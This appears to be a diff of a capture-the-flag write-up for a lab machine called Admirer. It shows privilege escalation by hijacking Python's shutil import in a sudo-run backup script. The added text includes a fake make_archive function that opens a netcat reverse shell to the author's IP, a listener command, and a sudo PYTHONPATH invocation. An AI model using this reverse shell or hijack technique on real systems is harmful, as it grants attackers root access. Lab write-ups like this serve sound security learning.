@@ -580,9 +580,41 @@ I was wrong! Nothing is working. Also, I couldn't modify ```admin_tasks.sh```.
 When I searched “privilage escalation via python” I found this website:
 https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
 
-I read it carefully and check ```admin_tasks.sh``` codes. I think that if I create a python file which can execute a netcat command, I can hijack ```admin_tasks.sh```.
+I read it carefully and check ```admin_tasks.sh``` codes.
+```
+waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
+...
 
-So I created a python file and write these codes and save it:
+}backup_web()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Running backup script in the background, it might take a while..."
+        /opt/scripts/backup.py &
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+...
+```
+```admin_tasks.sh``` is running ```backup.py```.
+
+Let's check ```backup.py```
+```
+#!/usr/bin/python3
+
+from shutil import make_archive
+src = '/var/www/html/'
+
+# old ftp directory, not used anymore
+#dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+make_archive(dst, 'gztar', src)
+```
+It import ```make_archive``` function from shutil file.
+
+So I created a ```shutil.py``` inside ```hsn``` folder and write these codes and save it:
 ```
 import os
 
@@ -590,14 +622,14 @@ def make_archive(x, y, z):
 	os.system("nc 10.10.14.204 4444 -e '/bin/bash'")
 ```
 
-When this file is executed, it will execute ```/bin/bash``` on my IP and port 4444. So I need to listen this port with netcat.
+When this function is executed, it will execute ```/bin/bash``` on my IP and port 4444. So I need to listen this port with netcat.
 ```
 ┌─[✗]─[root@hsn]─[/home/hsn]
 └──╼ #nc -nlvp 4444
 listening on [any] 4444 ...
 ```
 
-So, how to execute ```admin_tasks.sh``` via my simple python app. Here it is:
+So, how to execute ```admin_tasks.sh``` script after our changes. Here it is:
 ```
 waldo@admirer:~/hsn$ sudo PYTHONPATH=~/hsn /opt/scripts/admin_tasks.sh
 
@@ -613,6 +645,8 @@ waldo@admirer:~/hsn$ sudo PYTHONPATH=~/hsn /opt/scripts/admin_tasks.sh
 Choose an option: 6
 Running backup script in the background, it might take a while...
 ```
+And select 6 ```Backup web data``` in order to execute ```backup.py```.
+
 Look at netcat!
 
 ```
